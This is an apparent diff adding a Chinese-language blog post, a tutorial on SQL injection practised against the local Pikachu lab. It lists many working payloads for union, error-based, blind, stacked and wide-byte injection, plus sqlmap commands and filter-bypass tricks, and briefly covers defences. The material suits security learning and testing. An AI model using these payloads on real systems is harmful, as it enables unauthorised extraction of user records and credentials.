@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/xxw/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Pisces | Gemini":240,"width":300,"display":"post","padding":20,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SQL注入原理程序员没有遵循代码与数据分离原则，使用户数据作为代码执行。 SQL注入条件用户可以控制数据的输入。原本要运行的代码拼接了用户的输入并运行。基本知识（Mysql）注入点检测页面返回正常 and 1&#x3D;1–+ or 1&#x3D;2–+ 页面返回异常 and 1&#x3D;2–+ or 1&#x3D;1–+ 添加 sleep(3)看页面是否返回时间长 其他关于select、union、limit、database等sq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入漏洞">
+<meta property="og:url" content="http://example.com/2022/04/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="张轩儒">
+<meta property="og:description" content="SQL注入原理程序员没有遵循代码与数据分离原则，使用户数据作为代码执行。 SQL注入条件用户可以控制数据的输入。原本要运行的代码拼接了用户的输入并运行。基本知识（Mysql）注入点检测页面返回正常 and 1&#x3D;1–+ or 1&#x3D;2–+ 页面返回异常 and 1&#x3D;2–+ or 1&#x3D;1–+ 添加 sleep(3)看页面是否返回时间长 其他关于select、union、limit、database等sq">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-04-22T00:53:04.000Z">
+<meta property="article:modified_time" content="2022-04-22T01:01:55.546Z">
+<meta property="article:author" content="zhangxiaoxuan">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/04/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SQL注入漏洞 | 张轩儒</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">张轩儒</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录生活的点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/author.jpg">
+      <meta itemprop="name" content="zhangxiaoxuan">
+      <meta itemprop="description" content="活的认真，笑的放肆，忠于自己">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张轩儒">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-22 08:53:04 / 修改时间：09:01:55" itemprop="dateCreated datePublished" datetime="2022-04-22T08:53:04+08:00">2022-04-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>SQL注入原理<br>程序员没有遵循代码与数据分离原则，使用户数据作为代码执行。</p>
+<p>SQL注入条件<br>用户可以控制数据的输入。<br>原本要运行的代码拼接了用户的输入并运行。<br>基本知识（Mysql）<br>注入点检测<br>页面返回正常</p>
+<p>and 1=1–+</p>
+<p>or 1=2–+</p>
+<p>页面返回异常</p>
+<p>and 1=2–+</p>
+<p>or 1=1–+</p>
+<p>添加 sleep(3)看页面是否返回时间长</p>
+<p>其他<br>关于select、union、limit、database等sql语句及函数我都放在了这篇文章，如果您对基本函数还不了解，可以先看下面的文章。</p>
+<p>网络安全-Mysql注入知识点</p>
+<p>文中有使用sqlmap，关于sqlmap的内容，可以查看网络安全-sqlmap学习笔记</p>
+<p>基本流程</p>
+<p>sql注入流程图<br>SQL注入技术</p>
+<p>sql注入技术<br>先按照sqlmap的分类（BUETSQ），然后是其他，由易到难，使用靶机pikachu。</p>
+<p>Union注入攻击<br>利用union查询来运行想要的sql语句</p>
+<p>字符型注入，目标：获取当前数据库中的所有用户名及其他感兴趣的信息。</p>
+<p>注入点判断<br>d’ and 1=1#</p>
+<p>返回正常<br> 字符型注入点，使用单引号闭合即可</p>
+<p>字段判断<br>order by 1和2时没有问题</p>
+<p>d’ order by 3#</p>
+<p>order by 3出错<br>字段数为2，有回显，union没有被过滤，使用Union注入</p>
+<p>sql语句猜测，从某个表根据用户名返回两个字段</p>
+<p>select field1,field2 from table where 用户名 = ‘’</p>
+<p>查询当前数据库<br>当前的用database()函数即可</p>
+<p>d’ UNION SELECT 1,database() from information_schema.schemata#</p>
+<p>获取数据库<br> 得到数据库名pikachu</p>
+<p>查询表名<br>d’ UNION SELECT 1,table_name from information_schema.tables where table_schema=’pikachu’#<br>查询到的表</p>
+<p>数据库的表<br>得到表名httpinfo、member、message、users、xssblind</p>
+<p> 查询列名<br>根据我们的目标，假设对member感兴趣</p>
+<p>d’ UNION SELECT 1,column_name from information_schema.columns where table_schema=’pikachu’ and table_name=’member’#</p>
+<p>列名<br> users表中有id、username、pw、phonenum、address、email</p>
+<p>通过以上信息，猜测sql语句</p>
+<p>select id,email from member where username = ‘’</p>
+<p>查询所需字段值<br>有了username就可以通过他给的表单获取对应email，所以就假设我们对phone、address更感兴趣，0x3a是冒号</p>
+<p>d’ UNION SELECT 1,group_concat(username,0x3a,phonenum,0x3a,address) from member#</p>
+<p>得到数据<br>你可以尝试以下查询 vince。</p>
+<p>Error注入攻击<br>如果union被过滤，可以使用基于错误的注入攻击，一般利用floor，updatexml, extractvalue函数、还有exp和一些几何函数，补充exp：Error Based SQL Injection Using EXP | 🔐Blog of Osanda。利用了”DOUBLE value is out of range”。</p>
+<p>Floor函数报错</p>
+<p>关键函数：<br>Rand() ——-产生0~1的伪随机数<br>Floor() ——-向下取整数<br>Concat() —–连接字符串<br>Count() ——计算总数</p>
+<p>Payload如下：<br>Select count(*),concat(PAYLOAD,floor(rand(0)*2))x from 表名 group by x;</p>
+<p>floor和rand(0)产生重复序列<br> 根据x字段进行分组，统计x的个数</p>
+<p>group by key 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。（插入数据时，会再计算rand值）</p>
+<p>如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
+<p>爆数据库lady_killer9。</p>
+<p>这里利用updatexml函数，报错原理简单，第二个不是XPATH类型字符串就报错。</p>
+<p>一般使用如下结构,sql是你想运行的sql语句。</p>
+<p>updatexml(1,concat(0x7e,(sql),0x7e),1)</p>
+<p>0x7e是~，使用char(126)也是一样的，concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出sql语句运行后的结果。</p>
+<p>sqlmap集成<br> sqlmap集成了上述的三种方式，同时还有其他的</p>
+<p>字符型注入，目标：获取当前数据库中的users表中的所有用户名及其他感兴趣的信息。</p>
+<p>注入点和字段数判断同上，已知：</p>
+<p>字符型注入点，使用单引号闭合即可</p>
+<p>字段数为2，有回显，updatexml没有被过滤，使用报错注入</p>
+<p>查询表名<br>d’ and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#<br>注意，结果只能是一行，所以使用了limit 0,1获得第一个表</p>
+<p>结果<br>当sql语句是使用 limit 3,1是时候就可以得到了users表。</p>
+<p> 查询列名<br>d’ and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 0,1),0x7e),1)#</p>
+<p>第一个列名<br>同样，当sql语句是使用 limit 1,1、limit 2,1、limit 3,1时，就得到了username、password、level三个列名。</p>
+<p>查询所需字段值<br>假设我们对username和password感兴趣</p>
+<p>d’ and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) from users limit 0,1),0x7e),1)#</p>
+<p>结果<br>当然密码加了密，剩下的交给搞Cryto的人吧。可以看出报错注入攻击比较麻烦，如果有回显，union没有被过滤，还是优先使用union注入攻击。</p>
+<p>—————————————-没有回显—————————————————</p>
+<p>接下来就是难度中等的了，没有回显，采用盲注</p>
+<p>Boolean注入攻击<br>基于布尔判断的攻击</p>
+<p>根据前面知道有个用户名是vince。</p>
+<p>vince’ and length(database())=7#</p>
+<p>没有错误<br>此时，条件语句where username=’vince’ and length(database())=7是True，也就是说数据库长度为7。</p>
+<p>vince’ and substr(database(),1,1)=’p’#</p>
+<p>字符<br>vince’ and ascii(substr(database(),1,1))=112#</p>
+<p>ascii<br>vince’ and ascii(substr(database(),2,1))=105#<br>上面是数据库名第二字符’i’的，数据库名出来后再将database()改为select语句去找表名等，一般是写脚本，一个个的手工判断时间太长，有时间写了脚本再来更新，或者使用sqlmap。</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a> –technique=B -dbms mysql –threads 5 -v 3 -dbs –batch</p>
+<p>基于boolean的<br>使用的是MID函数，和substr一样。在网络安全-Mysql注入知识点中有这个函数的用法。</p>
+<p>Time注入攻击<br>基于时间的攻击，利用if、sleep、benchmark、get_lock等函数，使用rpad或repeat构造长字符串，加RLIKE，利用多个大表的笛卡尔积。</p>
+<p>GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s)，这种绕过方法是存在限制条件的，即数据库的连接必须是持久连接</p>
+<p>vince’ and if(length(database()=7),sleep(3),1)#</p>
+<p>3秒后后显示<br>同样，也是写脚本，通过返回的时间长短判断，可使用sqlmap。</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</a> –technique=T –time-sec 2 -dbms mysql –threads 5 -v 3 -dbs –batch</p>
+<p>时间注入<br> 太慢了，有其他办法不建议使用这个。</p>
+<p>Stack注入攻击<br>需要后台代码是可以执行多条sql语句的，php中是使用PDO方式执行多条语句。</p>
+<p>堆叠注入攻击可以执行多条语句，多语句之间以分号隔开。利用这个特点可以在后面的语句中构造自己要执行的语句。</p>
+<p>获取数据库、表（单引号闭合）</p>
+<p>‘;show databases;show tables;%23</p>
+<p>sqlmap<br> 可以看到sqlmap中注入技术选择S时，payload中是含分号的。</p>
+<p>————————————–接下来是比较特殊/高级的sql绕过注入——————————–</p>
+<p>inline Query绕过注入攻击<br>内联查询注入攻击</p>
+<p>宽字节绕过注入<br>宽字节是在一些特定的编码，如GBK中才有的，编码将两个字节认为是一个汉字（前一个字符ascii码要大于128，才到汉字的范围）。addslashes函数为了防止sql注入，将传入参数值进行转义，将’ 转义为&#39;，单引号失去作用。因此，我们需要将\给绕过，这样才可以加’号。</p>
+<p>&#39;编码<br>\编码为%5C,我们一般在地址后添加%df。</p>
+<p>绕过<br>添加后\变成了汉字，这样就绕过了。之后就和前面的一样了，当然，还有双引号等，除了GBK还有GB2312等编码，有兴趣的可以整理一下所有的。</p>
+<p>为了方便理解，修改一下源代码，打印一下sql语句 。</p>
+<p>修改源代码</p>
+<p>转义<br>%df%5C%27 or 1=1#<br> 后端及数据库设置字符集为GBK，或其他低位为%5C的字符集。</p>
+<p>Pikachu其他题目<br>火狐浏览器及插件hackbar v2。</p>
+<p>数字型注入<br>参数为数字，一般是id等。</p>
+<p>参数<br>参数为id和submit，其中id为整型。</p>
+<p>猜测sql语句形式为</p>
+<p>select userid from users where id = 参数</p>
+<p> 注入点判断<br>id=1 and 1=1&amp;submit=查询<br>id=1 and 1=2&amp;submit=查询<br>字段数确定<br>id=3 order by 3&amp;submit=查询</p>
+<p>3时报错<br> 我就从2开始的，靶机的一般不会太大。真实的网络实战的话还是自己写脚本或使用sqlmap。</p>
+<p>查询当前数据库<br>id=1 union select 1,database()&amp;submit=查询</p>
+<p>数据库pikachu<br>查询当前表<br>由于火狐对hackbar的一些限制，插件无法正常运行sql语句，就使用Navicat了。如果你不是最新版火狐的话可以试一试。</p>
+<p>post data应该是这样的</p>
+<p>UNION SELECT 1,group_concat(table_name) from information_schema.tables where table_schema=database()&amp;submit=查询<br>实际sql语句执行是这样的</p>
+<p>查询表<br>查询当前列<br>post data应该是这样的</p>
+<p>id=1 UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=’member’&amp;submit=查询<br>实际sql语句执行是这样的</p>
+<p>当前列<br>查询当前字段<br>post data应该是这样的</p>
+<p>id=1 UNION SELECT 1,group_concat(username,0x3a,phonenum,0x3a,address) from member&amp;submit=查询<br>实际sql语句执行是这样的</p>
+<p>用户名，手机号，住址<br>0x3a是冒号的ASCII码</p>
+<p>一次手工注入的基本过程如上所述，接下来大部分只讲原理，有特殊的地方再提示。</p>
+<p>字符型注入<br>将参数以字符或字符串形式读入，通过闭合+注释的方式来进行SQL注入，一般是’或”，或者结合()。</p>
+<p>判断闭合</p>
+<p>标题<br>获取数据<br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d&#39;union">http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d&#39;union</a> select 1,database()–+&amp;submit=%E6%9F%A5%E8%AF%A2</p>
+<p>获取数据库名<br>后面的和之前的差不多。</p>
+<p>搜索型注入<br>其实也算是字符型注入</p>
+<p>搜索一般sql语句如下，</p>
+<p>select * from users where username like ‘%$name’</p>
+<p>测试闭合字符<br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=frankyu&#39;or">http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=frankyu&#39;or</a> 1=1–+&amp;submit=%E6%90%9C%E7%B4%A2</p>
+<p>获取所搜索表所有内容<br>使用’or 1=1，条件判断为TRUE，所有的都返回，想获取其他的你就从前面常用语句去粘贴就行了。</p>
+<p>xx型注入<br>注入判断</p>
+<p>frankyu’判断<br>我还以为书上没写的呢，其实还是字符型，只不过需要两个字符去闭合，就是前面提到的()，sql语句类型下面这种。</p>
+<p>select * from users where username = (‘$name’)</p>
+<p>不写了，和前面的差不多。</p>
+<p> “insert/update”注入</p>
+<p>标题<br>1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)and’<br>0x7e是~，结果如下：</p>
+<p>数据库<br>“delete注入”<br>和上面的差不多,id那里可以报错注入，可以使用Burpsuite进行抓包。</p>
+<p>宽字节注入<br>博主数据库编码设置的utf-8，就不演示了，其实除了加一个%df外也没什么特别的地方，也可以使用其他的，sqlmap中有temper脚本进行绕过，使用的是%bf。</p>
+<p>tamper脚本<br>绕过<br>大小写绕过<br>sql语句对一些关键词不区分大小写，如果网站代码没有进行大小写检查可以使用</p>
+<p>UniOn select * from user</p>
+<p>双写绕过<br>网站代码找到关键词后删除，可以通过双写构造删除后符合语法的sql语句</p>
+<p>selselectect * from user</p>
+<p>内联注释<br>mysql扩展功能，在/*后加惊叹号，注释中的语句会被执行</p>
+<p>and /<em>!select * from user</em>/</p>
+<p>注释符绕过<br>注释符不影响语句的连接，</p>
+<p>sel/**/ect * from user</p>
+<p>or/and绕过<br>使用逻辑符号代替：and = &amp;&amp;, or = ||</p>
+<p>select * from emp where sal &gt; 500 &amp;&amp; sal &lt; 3000;</p>
+<p>空格绕过<br>有的网站过滤了空格，可以尝试使用</p>
+<p>%0a、%b、%0c、%0d、%09、%a0</p>
+<p>或者</p>
+<p>/**/、()</p>
+<p>例如</p>
+<p> select * from/**/emp where (sal) &gt; 500 &amp;&amp; sal &lt; 3000;</p>
+<p>等价于</p>
+<p>  select * from emp where sal &gt; 500 and sal &lt; 3000;</p>
+<p>防御SQL注入的方法<br>使用预编译语句<br>绑定变量，攻击者无法改变SQL的结构。不同的编程语言Java、Php有不同的语法，就不做展示了。在网络安全-php安全知识点中提到了使用pdo来防御。</p>
+<p>使用存储过程<br>使用安全的存储过程对抗SQL注入，由于存储过程中也可能存在SQL注入问题，应尽量避免使用动态SQL语句。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/22/webshell/" rel="prev" title="webshell">
+      <i class="fa fa-chevron-left"></i> webshell
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/22/xss%E6%94%BB%E5%87%BB/" rel="next" title="xss攻击">
+      xss攻击 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zhangxiaoxuan"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">zhangxiaoxuan</p>
+  <div class="site-description" itemprop="description">活的认真，笑的放肆，忠于自己</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zhangxiaoxuan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/xxw/anime.min.js"></script>
+  <script src="/xxw/velocity/velocity.min.js"></script>
+  <script src="/xxw/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
